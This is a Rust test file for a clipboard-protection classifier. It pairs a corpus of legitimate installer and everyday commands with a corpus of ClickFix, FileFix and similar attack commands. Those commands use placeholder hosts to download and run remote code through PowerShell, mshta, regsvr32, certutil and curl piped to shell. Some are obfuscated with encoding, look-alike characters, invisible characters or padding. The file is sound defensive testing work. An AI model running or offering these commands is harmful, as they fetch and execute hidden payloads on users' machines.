/* This Source Code Form is subject to the terms of the Mozilla Public
 * License, v. 2.0. If a copy of the MPL was not distributed with this
 * file, You can obtain one at http://mozilla.org/MPL/2.0/. */

//! The corpora: attack shapes that must be stopped when a script writes them and they are
//! not on screen, and legitimate commands that must never be blocked when they are on
//! screen. `cargo test -p clipguard --test corpus -- --nocapture` prints the tables.
//!
//! The attack shapes are written from public reports (Microsoft, mr.d0x, Huntress,
//! ClickGrab's technique notes) with harmless addresses (`*.invalid`, TEST-NET IPs);
//! nothing here is a real sample. Real samples are checked outside the repository with
//! the ignored test at the end (they are not ours to publish).

use clipguard::{
    classify, decide, display_text, hosts, is_substitution, is_visible, placeholder, Action,
    Context, Level, Mode, Notice, Reason, Source, Visibility,
};

/// Shapes of ClickFix, FileFix and similar commands, with the lowest level each must get.
const ATTACKS: &[(&str, Level)] = &[
    (r#"powershell -w hidden -ep bypass -c "iwr https://evil.invalid/a.ps1 | iex""#, Level::High),
    (r#"powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('https://evil.invalid/x')""#, Level::High),
    (r#"cmd /c start /min powershell -w h -nop -c "irm 192.0.2.5/p | iex""#, Level::High),
    ("mshta https://evil.invalid/verify.hta # I am not a robot - reCAPTCHA Verification ID: 7412", Level::Critical),
    ("mshta.exe https://evil.invalid/a.mp4 # Cloudflare verification", Level::Critical),
    (r#"p^o^w^e^r^s^h^e^l^l -w h -c "iwr https://evil.invalid/a|iex""#, Level::High),
    ("powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA", Level::High),
    (r#"powershell -c "[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aWV4IChpd3IgJ2h0dHBzOi8vZXZpbC5leGFtcGxlJyk=')) | iex""#, Level::High),
    (r#"powershell -c "Invoke-WebRequest -Uri https://evil.invalid/d.bat -OutFile $env:TEMP\d.bat; Start-Process $env:TEMP\d.bat"      # C:\company\internal-secure\filedrive\HRPolicy.docx"#, Level::Med),
    (r#"cmd /c "curl -s http://192.0.2.40:5506/qk.vbs -o %temp%\qk.vbs && wscript %temp%\qk.vbs""#, Level::High),
    (r"conhost --headless cmd /c curl -ksfLS https://evil.invalid/s.txt -o %TEMP%\s.cmd & %TEMP%\s.cmd", Level::High),
    (r#"cmd /c "nslookup -q=TXT example.invalid 192.0.2.53 | find ""Name:"" > %temp%\a.cmd & %temp%\a.cmd""#, Level::High),
    ("finger gate@203.0.113.7 | cmd", Level::High),
    (r"net use Z: \\evil.invalid@SSL\share /persistent:no & Z:\update.cmd & net use Z: /delete", Level::High),
    ("msiexec /i https://evil.invalid/fix.msi /qn", Level::Med),
    (r"rundll32 \\evil.invalid@80\share\fix.dll,Start", Level::High),
    ("regsvr32 /s /n /u /i:https://evil.invalid/a.sct scrobj.dll", Level::High),
    (r#"forfiles /p C:\Windows\System32 /m notepad.exe /c "cmd /c curl -s https://evil.invalid/a | cmd""#, Level::Med),
    (r#"echo "Y3VybCAtcyBodHRwOi8vZXZpbC5leGFtcGxlL2QgfCBub2h1cCBiYXNoICY=" | base64 -d | bash"#, Level::High),
    (r#"/bin/bash -c "$(echo Y3VybCAtZnNTTCBodHRwczovL2V2aWwuZXhhbXBsZS9pIHwgemg= | base64 -D)""#, Level::High),
    ("curl -fsSL https://claude-code.example.invalid/install.sh | zsh", Level::Med),
    ("curl -s http://192.0.2.33/d/robert | nohup bash &", Level::High),
    (r#"osascript -e 'do shell script "curl -s https://evil.invalid/a | sh"'"#, Level::Med),
    ("curl -o /tmp/update https://evil.invalid/u && chmod +x /tmp/update && xattr -c /tmp/update && /tmp/update", Level::High),
    (r"powershell $d='p.ps1';(New-Object Net.WebClient).DownloadFile('https://evil.invalid/p',$env:USERPROFILE+'\Downloads\'+$d);Start-Process powershell -ArgumentList '-w hidden -f',$d", Level::High),
    ("iex (iwr 'https://evil.invalid/p.txt' -UseBasicParsing)", Level::Med),
    (r"cmdkey /add:evil.invalid /user:a /pass:b & regsvr32 /s \\evil.invalid\s\a.dll", Level::High),
    ("\u{440}owershell -c \"iwr https://evil.invalid/a | iex\"", Level::Critical),
    ("powershell\u{200b} -c \"iwr https://evil.invalid/a | iex\"", Level::Critical),
    ("explorer.exe https://evil.invalid/a.pdf.lnk", Level::Med),
    ("ssh -o StrictHostKeyChecking=no user@192.0.2.9 -R 9000:localhost:3389 -N", Level::Low),
    (r"bitsadmin /transfer j /download /priority foreground https://evil.invalid/a.exe %temp%\a.exe & %temp%\a.exe", Level::Med),
    (r"certutil -urlcache -f https://evil.invalid/a.exe %temp%\a.exe && %temp%\a.exe", Level::Med),
    (r#"python3 -c "import urllib.request as u;exec(u.urlopen('https://evil.invalid/p').read())""#, Level::Med),
    (r#"node -e "fetch('https://evil.invalid/p').then(r=>r.text()).then(eval)""#, Level::Med),
    (r"Start-Process msbuild -ArgumentList '\\evil.invalid\s\a.csproj' -WindowStyle Hidden", Level::High),
    ("irm evil.invalid/a | iex", Level::Med),
    (r"$u='https://evil.invalid/a';iwr $u -o $env:temp\a.exe;& $env:temp\a.exe", Level::Med),
    (r"ping -n 1 127.0.0.1 > nul & certreq -post -config https://evil.invalid/a c:\windows\win.ini %temp%\a.cmd & %temp%\a.cmd", Level::Med),
    // FileFix: the command is pushed past the end of Explorer's address bar.
    (concat!(
        r#"powershell -c "iwr https://evil.invalid/f.ps1 | iex""#,
        "                                                                                                                        ",
        r"# C:\company\internal-secure\filedrive\HRPolicy.docx"
    ), Level::Critical),
    (concat!(
        "Powershell.exe -c ping example.invalid",
        "                                                                                                                                                  ",
        r"# C:\company\internal-secure\filedrive\HRPolicy.docx"
    ), Level::Critical),
    // Terminal control characters: the end marker of bracketed paste runs what follows.
    ("curl -s https://evil.invalid/a | sh\u{1b}[201~", Level::Critical),
    ("sudo rm -rf ~/.cache\u{1b}[201~\n", Level::Critical),
    // Look-alike letters in the address (Cyrillic "е" and "х").
    ("curl -s https://\u{435}\u{445}ample.invalid/x | sh", Level::Critical),
    // An invisible character inside the comment of a command.
    ("curl https://evil.invalid/a | sh #\u{200b}x", Level::Critical),
    // A lure without a download.
    ("cmd /c echo verifying # I am not a robot: verification ID 4417", Level::Critical),
    // The variable trick from cmd and PowerShell string splitting.
    (r"cmd /c set a=pow&& set b=ershell&& call %a%%b% -c iwr evil.invalid/x|iex", Level::High),
    ("$a='i'+'e'+'x';$b='irm https://evil.invalid/x';&$a $b", Level::High),
    ("echo 'ZWNobyBoaQ==' | base64 --decode | sh", Level::High),
    ("curl -fsSL https://evil.invalid/a.sh -o /tmp/a.sh && bash /tmp/a.sh", Level::Med),
    ("curl -fsSL https://evil.invalid/a | sh\n", Level::Med),
    ("wget -qO- http://198.51.100.20/x | sh", Level::High),
    // Full-width letters and a typographic dash, which PowerShell reads as "-".
    ("\u{ff50}\u{ff4f}\u{ff57}\u{ff45}\u{ff52}\u{ff53}\u{ff48}\u{ff45}\u{ff4c}\u{ff4c} \u{2013}w hidden -c \"irm evil.invalid/x | iex\"", Level::High),
    // TerminalFix: a multi-line script for Windows Terminal.
    ("$ProgressPreference='SilentlyContinue'\n$s = irm https://evil.invalid/stage2.ps1\niex $s\n", Level::Med),
    ("mshta vbscript:Execute(\"CreateObject(\"\"WScript.Shell\"\").Run \"\"powershell -w hidden -c iwr evil.invalid/x|iex\"\",0:close\")", Level::High),
    (r"search-ms:query=invoice&crumb=location:\\evil.invalid@SSL\DavWWWRoot\docs", Level::Med),
];

/// Installers that projects publish on their own pages. On screen, a copy button writes
/// them without any message.
const KNOWN_INSTALLERS: &[&str] = &[
    "curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh",
    r#"/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)""#,
    "curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.40.1/install.sh | bash",
    "wget -qO- https://raw.githubusercontent.com/nvm-sh/nvm/v0.40.1/install.sh | bash",
    r#"sh -c "$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)""#,
    "curl -fsSL https://bun.sh/install | bash",
    r#"powershell -c "irm bun.sh/install.ps1 | iex""#,
    "curl -fsSL https://deno.land/install.sh | sh",
    "irm https://deno.land/install.ps1 | iex",
    "curl -LsSf https://astral.sh/uv/install.sh | sh",
    r#"powershell -ExecutionPolicy ByPass -c "irm https://astral.sh/uv/install.ps1 | iex""#,
    "irm get.scoop.sh | iex",
    "Invoke-RestMethod -Uri https://get.scoop.sh | Invoke-Expression",
    "Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))",
    "curl -fsSL https://claude.ai/install.sh | bash",
    "irm https://claude.ai/install.ps1 | iex",
    "curl -fsSL https://get.docker.com | sh",
    "curl -fsSL https://ollama.com/install.sh | sh",
    "curl -sfL https://get.k3s.io | sh -",
    "curl -fsSL https://tailscale.com/install.sh | sh",
    "curl https://mise.run | sh",
    "curl -sS https://starship.rs/install.sh | sh",
    "curl -sL https://aka.ms/InstallAzureCLIDeb | sudo bash",
    "curl -fsSL https://fnm.vercel.app/install | bash",
    "curl -fsSL https://get.pnpm.io/install.sh | sh -",
    "iwr https://get.pnpm.io/install.ps1 -useb | iex",
    "iwr -useb get.scoop.sh | iex",
    "curl -fsSL https://code-server.dev/install.sh | sh",
    "curl -L https://nixos.org/nix/install | sh",
    r#"curl -s "https://get.sdkman.io" | bash"#,
    "curl -fsSL https://install.julialang.org | sh",
    "curl https://cursor.com/install -fsS | bash",
    "curl -sSL https://install.python-poetry.org | python3 -",
    "(Invoke-WebRequest -Uri https://install.python-poetry.org -UseBasicParsing).Content | py -",
    "iex \"& { $(irm https://aka.ms/install-powershell.ps1) } -UseMSI\"",
    "Invoke-Expression (Invoke-WebRequest -Uri https://aka.ms/install-artifacts-credprovider.ps1 -UseBasicParsing).Content",
    r#"powershell -NoProfile -ExecutionPolicy Bypass -Command "iex ((New-Object System.Net.WebClient).DownloadString('https://chocolatey.org/install.ps1'))""#,
    "curl -fsSL https://deb.nodesource.com/setup_22.x | sudo -E bash -",
    "curl https://get.volta.sh | bash",
    "curl https://pyenv.run | bash",
    "curl -sSL https://get.rvm.io | bash -s stable",
    "curl -sSL https://install.pi-hole.net | bash",
    "curl -fsSL https://raw.githubusercontent.com/helm/helm/main/scripts/get-helm-3 | bash",
    "curl -sSL https://dot.net/v1/dotnet-install.sh | bash /dev/stdin --channel 8.0",
];

/// Other commands people copy from documentation, READMEs and Q&A sites, and ordinary
/// text. Like the installers, each must stay unblocked when a copy button writes it and
/// it is on screen.
const OTHER_LEGIT: &[&str] = &[
    // Installers we do not know: copied on screen, they get a one-time notice, no block.
    "irm https://get.activated.win | iex",
    "irm christitus.com/win | iex",
    "iwr -useb https://raw.githubusercontent.com/spicetify/cli/main/install.ps1 | iex",
    "curl -fsSL https://raw.githubusercontent.com/spicetify/cli/main/install.sh | sh",
    "curl -LO https://dl.k8s.io/release/v1.31.0/bin/linux/amd64/kubectl && chmod +x kubectl && sudo mv kubectl /usr/local/bin/",
    "Invoke-WebRequest -Uri https://aka.ms/installazurecliwindowsx64 -OutFile .\\AzureCLI.msi; Start-Process msiexec.exe -Wait -ArgumentList '/I AzureCLI.msi /quiet'; Remove-Item .\\AzureCLI.msi",
    // Everyday commands.
    "winget install --id Git.Git -e --source winget",
    "Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser",
    "sudo apt update && sudo apt install -y curl",
    "echo 'aGVsbG8K' | base64 -d",
    "cat ~/.ssh/id_ed25519.pub | ssh deploy@203.0.113.10 'cat >> ~/.ssh/authorized_keys'",
    "docker run -it --rm -p 8080:80 nginx",
    "git clone https://github.com/footprintsntrails/whisper-browser.git && cd whisper-browser && cargo test",
    "curl -I https://example.com",
    r#"curl -X POST -H 'Content-Type: application/json' -d '{"a":1}' https://api.example.com/v1/items"#,
    r#"powershell.exe -Command "Get-Process | Sort-Object CPU -Descending | Select-Object -First 5""#,
    "xattr -d com.apple.quarantine /Applications/Example.app",
    "sudo xattr -rd com.apple.quarantine /Applications/Example.app",
    "pip install requests",
    "python3 -m venv .venv && source .venv/bin/activate",
    "# Install the CLI\nnpm install -g example-cli",
    "regsvr32 /u example.dll",
    "certutil -hashfile file.iso SHA256",
    "rundll32.exe shell32.dll,Control_RunDLL appwiz.cpl",
    "wget -qO- https://packages.microsoft.com/keys/microsoft.asc | gpg --dearmor > packages.microsoft.gpg",
    "curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /etc/apt/keyrings/docker.gpg",
    r#"curl -s https://api.github.com/repos/rust-lang/rust/releases/latest | python3 -c "import sys,json;print(json.load(sys.stdin)['tag_name'])""#,
    "curl -s https://api.example.com/items | python -m json.tool",
    "curl https://example.com/data.json | jq .",
    r"powershell -ExecutionPolicy Bypass -File .\build.ps1",
    "iwr https://aka.ms/vs/17/release/vs_buildtools.exe -OutFile vs_buildtools.exe",
    "nohup ./server > /dev/null 2>&1 &",
    "kubectl apply -f https://raw.githubusercontent.com/kubernetes/dashboard/v2.7.0/aio/deploy/recommended.yaml",
    "ssh -L 8080:localhost:80 deploy@203.0.113.10",
    "ssh -R 9000:localhost:3000 serveo.net",
    "net use Z: \\\\fileserver\\share /persistent:yes",
    r#"for /f "tokens=*" %i in ('dir /b') do echo %i"#,
    "Get-ChildItem -Recurse -Filter *.log | Remove-Item",
    "$env:PATH += \";C:\\tools\"",
    "export PATH=\"$HOME/.cargo/bin:$PATH\"",
    "npx create-next-app@latest my-app",
    "brew install --cask firefox",
    "choco install -y nodejs-lts",
    "scoop install git",
    "cargo install ripgrep",
    "go install golang.org/x/tools/gopls@latest",
    "conda create -n env python=3.12",
    "docker compose up -d",
    "kubectl get pods -A",
    "terraform init && terraform plan",
    "make -j$(nproc)",
    "gcc -O2 -o hello hello.c && ./hello",
    "ffmpeg -i in.mp4 -c:v libx264 -crf 23 out.mp4",
    "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes",
    "sudo systemctl restart nginx",
    "journalctl -u nginx --since today",
    r#"find . -name "*.tmp" -delete"#,
    "tar -xzf archive.tar.gz -C /opt",
    "chmod +x ./install.sh && ./install.sh",
    "ping 1.1.1.1",
    "curl http://192.168.1.1/status",
    "Hello, world! This is ordinary text someone copied from a blog post.",
    "Привет! Это обычный русский текст со словами curl и bash в нём.",
    "Family photo \u{1f468}\u{200d}\u{1f469}\u{200d}\u{1f467} from the trip",
    "const cmd = 'git ' + branch;",
    "SELECT * FROM users WHERE id = 1;",
    "# Heading\n\nSome *markdown* with `code` and a [link](https://example.com).",
    // Copy buttons often add a line break at the end.
    "npm install --save-dev typescript\n",
];

fn legit() -> impl Iterator<Item = &'static str> {
    KNOWN_INSTALLERS.iter().chain(OTHER_LEGIT).copied()
}

fn script_copy() -> Context {
    Context {
        source: Source::ExecCommand,
        mode: Mode::Block,
        strict_script_copy: false,
        user_copy_notice: true,
        site_allowed: false,
        substituted: false,
    }
}

#[test]
fn every_attack_reaches_its_level() {
    let mut misses = Vec::new();
    for (text, want) in ATTACKS {
        let v = classify(text);
        if v.level < *want {
            misses.push(format!(
                "{:?} < {want:?}: {text:?} {:?}",
                v.level, v.features
            ));
        }
    }
    assert!(
        misses.is_empty(),
        "{} attack(s) below their level:\n{}",
        misses.len(),
        misses.join("\n")
    );
}

#[test]
fn attacks_written_by_a_script_and_not_on_screen_are_blocked() {
    let mut not_blocked = Vec::new();
    for (text, _) in ATTACKS {
        let v = classify(text);
        let d = decide(&v, &script_copy(), Visibility::NotVisible);
        if v.level >= Level::Med && d.action != Action::Block {
            not_blocked.push(format!("{d:?}: {text:?}"));
        }
    }
    assert!(not_blocked.is_empty(), "{}", not_blocked.join("\n"));
}

#[test]
fn legitimate_commands_on_screen_are_never_blocked() {
    let mut blocked = Vec::new();
    for text in legit() {
        let v = classify(text);
        let d = decide(&v, &script_copy(), Visibility::Visible);
        if d.action == Action::Block || v.level >= Level::High {
            blocked.push(format!(
                "{:?} {:?} {:?}: {text:?}",
                v.level, v.features, d.action
            ));
        }
    }
    assert!(blocked.is_empty(), "{}", blocked.join("\n"));
}

#[test]
fn legitimate_commands_copied_by_the_person_show_nothing() {
    let user = Context {
        source: Source::UserCopy,
        ..script_copy()
    };
    for text in legit() {
        let d = decide(&classify(text), &user, Visibility::Unknown);
        assert_eq!(d.action, Action::Ignore, "{text:?}");
    }
}

#[test]
fn known_installers_on_screen_pass_silently() {
    let mut noisy = Vec::new();
    for text in KNOWN_INSTALLERS {
        let v = classify(text);
        let d = decide(&v, &script_copy(), Visibility::Visible);
        if d.notice != Notice::None {
            noisy.push(format!(
                "{:?} {:?} known={} {:?}: {text:?}",
                v.level,
                d.notice,
                v.known_installer,
                hosts(text)
            ));
        }
    }
    assert!(noisy.is_empty(), "{}", noisy.join("\n"));
}

#[test]
fn a_command_in_the_first_part_of_a_large_write_is_still_caught() {
    // The whole write up to the scan cap is classified, so a command 150 KiB in -- which
    // the old head+tail scan dropped -- is caught at its real level.
    let payload = "powershell -w hidden -c \"iwr https://evil.invalid/m | iex\"";
    let pad = format!("# {}", "x".repeat(150_000));
    let big = format!("{pad}\n{payload}\n{pad}");
    let v = classify(&big);
    assert!(v.level >= Level::High, "{:?}", v.level);
    assert!(!v.reasons.contains(Reason::Oversize));
    assert_eq!(
        decide(&v, &script_copy(), Visibility::NotVisible).action,
        Action::Block
    );
}

#[test]
fn a_command_buried_past_the_scan_cap_is_blocked_as_oversize() {
    // The command sits after more than the scan cap of filler, so it is in the unscanned
    // part. The write is treated as at least MED and blocked, at 300 KiB and at 5 MiB.
    let payload = "powershell -w hidden -c \"iwr https://evil.invalid/m | iex\"";
    for pad_len in [300_000usize, 5_000_000] {
        let pad = format!("# {}", "x".repeat(pad_len));
        let big = format!("{pad}\n{payload}\n{pad}");
        let v = classify(&big);
        assert_eq!(v.level, Level::Med, "pad {pad_len}: {:?}", v.level);
        assert!(v.reasons.contains(Reason::Oversize), "pad {pad_len}");
        assert!(!v.known_installer);
        assert_eq!(
            decide(&v, &script_copy(), Visibility::NotVisible).action,
            Action::Block,
            "pad {pad_len}"
        );
        // The person's own copy of something huge is never blocked.
        let user = Context {
            source: Source::UserCopy,
            ..script_copy()
        };
        assert_eq!(
            decide(&v, &user, Visibility::Unknown).action,
            Action::Ignore
        );
    }
}

#[test]
fn a_trailing_line_break_is_reported_and_cut() {
    let v = classify("curl -fsSL https://evil.invalid/a | sh\n");
    assert!(v.reasons.contains(Reason::TrailingNewline));
    let d = decide(&v, &script_copy(), Visibility::Visible);
    assert!(d.strip_trailing);
}

#[test]
fn p2_substitution_blocks_only_when_the_replacement_is_more_dangerous() {
    // This is the parent's P2 path (ClipboardGuard.cpp): classify the clipboard, ask
    // is_substitution whether the page handler made it worse than the selection, then
    // decide as a PageReplacedCopy.
    let p2 = |selection: &str, clipboard: &str| -> Action {
        let v = classify(clipboard);
        let substituted = v.level != Level::None && is_substitution(selection, clipboard, v.level);
        let ctx = Context {
            source: Source::PageReplacedCopy,
            substituted,
            ..script_copy()
        };
        decide(&v, &ctx, Visibility::NotVisible).action
    };

    // Harmless: the handler kept the selection and appended a source line. Do nothing.
    assert_eq!(
        p2(
            "See the installation guide for details.",
            "See the installation guide for details.\n\nRead more at https://example.invalid/docs",
        ),
        Action::Ignore
    );
    // More dangerous: a benign selection replaced with a malicious command. Block.
    assert_eq!(
        p2(
            "Verify you are human",
            "powershell -w hidden -c \"iwr https://evil.invalid/b | iex\"",
        ),
        Action::Block
    );
    // Not more dangerous: the person already selected a MED installer and a button tidied
    // it. Not a substitution, so it is not blocked.
    assert_ne!(
        p2(
            "curl -fsSL https://bun.sh/install | bash",
            "curl -fsSL https://bun.sh/install | bash   # tidied",
        ),
        Action::Block
    );
}

#[test]
fn the_page_text_decides_visibility_for_installfix() {
    // InstallFix: the page shows the real installer, the button copies another command.
    let shown = "curl -fsSL https://claude.ai/install.sh | bash";
    let copied = "curl -fsSL https://claude-code.example.invalid/install.sh | bash";
    assert!(is_visible(shown, &[shown]));
    assert!(!is_visible(copied, &[shown]));
    let v = classify(copied);
    assert_eq!(
        decide(&v, &script_copy(), Visibility::NotVisible).action,
        Action::Block
    );
}

#[test]
fn the_placeholder_is_one_harmless_line() {
    let p = placeholder();
    assert!(p.starts_with("# "));
    assert!(
        !p.contains(['\n', '\r', '&', '|', ';', '$', '`', '(', ')', '<', '>', '%', '^', '"', '\''])
    );
    assert_eq!(classify(p).level, Level::None);
    assert_eq!(display_text(p), p);
}

#[test]
fn print_tables() {
    let count = |items: &mut dyn Iterator<Item = &str>| {
        let mut by_level = [0usize; 5];
        for t in items {
            by_level[classify(t).level as usize] += 1;
        }
        by_level
    };
    let a = count(&mut ATTACKS.iter().map(|(t, _)| *t));
    let k = count(&mut KNOWN_INSTALLERS.iter().copied());
    let o = count(&mut OTHER_LEGIT.iter().copied());
    println!("corpus            n   NONE LOW MED HIGH CRITICAL");
    println!(
        "attack shapes   {:3}   {:4} {:3} {:3} {:4} {:8}",
        ATTACKS.len(),
        a[0],
        a[1],
        a[2],
        a[3],
        a[4]
    );
    println!(
        "known installers{:3}   {:4} {:3} {:3} {:4} {:8}",
        KNOWN_INSTALLERS.len(),
        k[0],
        k[1],
        k[2],
        k[3],
        k[4]
    );
    println!(
        "other legitimate{:3}   {:4} {:3} {:3} {:4} {:8}",
        OTHER_LEGIT.len(),
        o[0],
        o[1],
        o[2],
        o[3],
        o[4]
    );
    let mut notices = [0usize; 6];
    let mut blocks = 0;
    for t in legit() {
        let d = decide(&classify(t), &script_copy(), Visibility::Visible);
        notices[d.notice as usize] += 1;
        blocks += usize::from(d.action == Action::Block);
    }
    println!(
        "legitimate, copy button, on screen: {blocks} blocked, {} silent, {} address-bar icon, {} installer notice, {} warning",
        notices[0], notices[1], notices[2], notices[3]
    );
    let blocked_attacks = ATTACKS
        .iter()
        .filter(|(t, _)| {
            decide(&classify(t), &script_copy(), Visibility::NotVisible).action == Action::Block
        })
        .count();
    println!(
        "attack shapes, script, not on screen: {blocked_attacks}/{} blocked",
        ATTACKS.len()
    );
}

/// Real samples and big public corpora, kept outside the repository. The directory in
/// CLIPGUARD_CORPORA holds text files with one sample per line (`\n` written as the two
/// characters backslash and n): `*.attack.txt` must be stopped, `*.legit.txt` are counted.
/// CLIPGUARD_SHOW=flagged prints every sample at LOW or above, =missed every one below MED.
#[test]
#[ignore = "needs CLIPGUARD_CORPORA"]
fn external_corpora() {
    let Ok(dir) = std::env::var("CLIPGUARD_CORPORA") else {
        return;
    };
    let mut names: Vec<_> = std::fs::read_dir(&dir)
        .expect("CLIPGUARD_CORPORA is a directory")
        .flatten()
        .map(|e| e.path())
        .filter(|p| p.extension().is_some_and(|x| x == "txt"))
        .collect();
    names.sort();
    println!("file                                n     NONE    LOW    MED   HIGH  CRIT   blocked(script, not on screen)");
    for path in names {
        let text = std::fs::read_to_string(&path).expect("readable");
        let mut by_level = [0usize; 5];
        let mut blocked = 0;
        let mut n = 0;
        for line in text.lines().filter(|l| !l.trim().is_empty()) {
            let sample = line.replace("\\n", "\n");
            let v = classify(&sample);
            by_level[v.level as usize] += 1;
            blocked += usize::from(
                decide(&v, &script_copy(), Visibility::NotVisible).action == Action::Block,
            );
            n += 1;
            let show = std::env::var("CLIPGUARD_SHOW").unwrap_or_default();
            if (show == "flagged" && v.level >= Level::Low)
                || (show == "missed" && v.level < Level::Med)
            {
                println!(
                    "  {:?} {:?} {}",
                    v.level,
                    v.features,
                    sample.chars().take(140).collect::<String>()
                );
            }
        }
        let name = path
            .file_name()
            .unwrap_or_default()
            .to_string_lossy()
            .into_owned();
        println!(
            "{name:<30} {n:7} {:8} {:6} {:6} {:6} {:5}   {blocked}",
            by_level[0], by_level[1], by_level[2], by_level[3], by_level[4]
        );
    }
}

/// Time per write, in a release build:
/// `cargo test --release -p clipguard --test corpus -- --ignored --nocapture timing`.
#[test]
#[ignore = "prints timings"]
fn timing() {
    use std::time::Instant;
    let time = |name: &str, text: &str, rounds: u32| {
        let start = Instant::now();
        for _ in 0..rounds {
            std::hint::black_box(classify(std::hint::black_box(text)));
        }
        let per = start.elapsed() / rounds;
        println!("{name:<40} {:>8} bytes  {per:?} per call", text.len());
    };
    let start = Instant::now();
    classify("warm up");
    println!(
        "first call (compiles the rules)          {:?}",
        start.elapsed()
    );
    time(
        "short command",
        "curl -fsSL https://bun.sh/install | bash",
        2000,
    );
    time(
        "short prose",
        "Hello, world! Ordinary text copied from a page.",
        2000,
    );
    time("attack, CRITICAL", ATTACKS[3].0, 2000);
    let page = "Lorem ipsum dolor sit amet, consectetur adipiscing elit. ".repeat(4600);
    time("256 KiB of prose", &page, 20);
    let code = "curl -fsSL https://x.invalid/a | sh # comment\n".repeat(5800);
    time("256 KiB of commands", &code, 10);
    let spaces = format!("powershell{}#", " ".repeat(1 << 20));
    time("1 MiB of spaces (padding)", &spaces, 10);
    let mixed = "\u{200b}a\u{440}".repeat(100_000);
    time("invisible and look-alike characters", &mixed, 5);
    let pipes = "curl | ".repeat(40_000);
    time("280 KB of curl pipes", &pipes, 5);
    // F1: a write larger than the scan cap costs the same as one at the cap -- the work is
    // bounded, not linear in the write size -- because the classifier scans only the first
    // MAX_SCAN_BYTES and treats the rest as oversize. (A full linear scan of these would be
    // ~10 ms per 256 KiB, i.e. hundreds of ms at 16 MiB, on the parent main thread.)
    for mib in [1usize, 4, 16] {
        let big = "curl -fsSL https://x.invalid/a | sh # comment\n".repeat(mib * 23000);
        time(&format!("{mib} MiB write (bounded to the cap)"), &big, 5);
    }
}
